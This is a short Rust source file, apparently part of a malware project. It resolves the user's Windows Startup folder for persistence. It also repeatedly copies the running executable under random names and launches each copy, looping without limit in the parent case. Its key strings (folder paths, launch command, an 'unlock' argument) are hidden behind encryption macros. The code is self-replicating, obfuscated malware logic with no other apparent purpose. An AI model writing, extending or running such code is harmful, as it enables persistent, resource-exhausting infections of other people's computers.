use crate::agtools;

pub(crate) fn get_win_start(startup: &mut String) {
    let user = agtools::get_username();

    let target_formatter = if cfg!(debug_assertions) {
        decrypt_to_string!(WIN_DEBUG_STARTUP_FOLDER_FORMATTER)
    } else {
        decrypt_to_string!(WIN_STARTUP_FOLDER_FORMATTER)
    };

    let target = sprintf::sprintf!(&target_formatter, user).unwrap();
    startup.push_str(&target);
}

pub(crate) fn w_copy(source: &str, target: &str, child: bool) {
    if !agtools::ensure_dir(target) {
        return;
    }

    let child_name_formatter = decrypt_to_string!(WIN_CHILD_NAME_FORMATTER);
    let child_spawn_formatter = decrypt_to_string!(WIN_EXEC_FORMATTER);
    loop {
        let child_number = rand::random::<u64>();
        let child_name = sprintf::sprintf!(&child_name_formatter, child_number).unwrap();

        let new_path = format!("{target}/{child_name}");
        agtools::copy_proc(source, &new_path);

        let child_unlock = if child {
            ""
        } else {
            &String::from_utf8(decrypt!(UNLOCK_CHILD)).unwrap()
        };

        let args = sprintf::sprintf!(&child_spawn_formatter, child_name, child_unlock).unwrap();
        agtools::start_proc(&args);

        if child {
            return;
        }
    }
}
